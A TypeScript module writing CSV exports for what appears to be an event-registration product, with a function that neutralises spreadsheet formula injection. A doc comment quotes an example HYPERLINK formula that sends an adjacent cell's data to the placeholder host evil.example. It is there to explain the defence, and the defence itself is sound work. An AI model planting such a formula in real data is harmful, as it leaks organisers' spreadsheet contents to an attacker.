/**
 * CSV.
 *
 * Hand-written rather than a dependency, for one reason that is not "it is
 * easy": the escaping rule below has to be ours, and a CSV library will not do
 * it because it is not part of the CSV format.
 */

import { cellText, type CellValue, type Table } from './table.ts'

/**
 * The characters Excel, LibreOffice and Google Sheets treat as the start of a
 * formula when a cell is opened, not when it is written.
 *
 * `\t` and `\r` are on the list because both are stripped by the spreadsheet
 * before it looks at the first character, so a value beginning with a tab and
 * then `=` is still a formula.
 */
const FORMULA_PREFIXES = ['=', '+', '-', '@', '\t', '\r']

/**
 * Neutralises a value that a spreadsheet would otherwise execute.
 *
 * This is the one piece of security in the export path, and the threat is
 * concrete rather than theoretical: **delegate names arrive through the public
 * registration form, which is the only unauthenticated write in the product.**
 * A registrant is free to enter `=HYPERLINK("https://evil.example?d="&A1,"Click")`
 * as their full name. Nothing rejects it — it is a name field and names contain
 * anything — and it sits in the database looking harmless until an organiser
 * exports the delegate list and double-clicks the file. Then it runs, on their
 * machine, with their spreadsheet's permissions, and the classic payload
 * exfiltrates the column beside it.
 *
 * The fix is a leading apostrophe, which every spreadsheet reads as "this is
 * text" and does not display. Numbers are passed through untouched, so `-5`
 * stays a number that can be summed — applying this to numerics is the mistake
 * that turns a working spreadsheet into a column of text.
 */
export function neutraliseFormula(value: string): string {
  if (value.length === 0) return value
  return FORMULA_PREFIXES.includes(value[0]!) ? `'${value}` : value
}

function quote(value: string): string {
  // RFC 4180 plus one addition: a value with leading or trailing spaces is
  // quoted too, because otherwise the reader is free to strip them and a school
  // name that genuinely ends in a space stops matching on the way back in.
  const needsQuotes = /[",\r\n]/.test(value) || value !== value.trim()
  return needsQuotes ? `"${value.replaceAll('"', '""')}"` : value
}

function field(value: CellValue): string {
  if (typeof value === 'number') return String(value)
  return quote(neutraliseFormula(cellText(value)))
}

/**
 * Writes a table as CSV.
 *
 * CRLF line endings per RFC 4180, and a UTF-8 byte order mark — without the
 * BOM, Excel on Windows reads the file as the system codepage and every
 * accented name in it is mojibake. Most of this product's delegates have names
 * Excel gets wrong without it.
 */
export function toCsv(table: Table): Buffer {
  const lines: string[] = []

  lines.push(table.columns.map((column) => field(column.header)).join(','))
  for (const row of table.rows) {
    lines.push(row.map(field).join(','))
  }

  const BOM = '\uFEFF'
  return Buffer.from(`${BOM}${lines.join('\r\n')}\r\n`, 'utf8')
}

export const CSV_CONTENT_TYPE = 'text/csv; charset=utf-8'
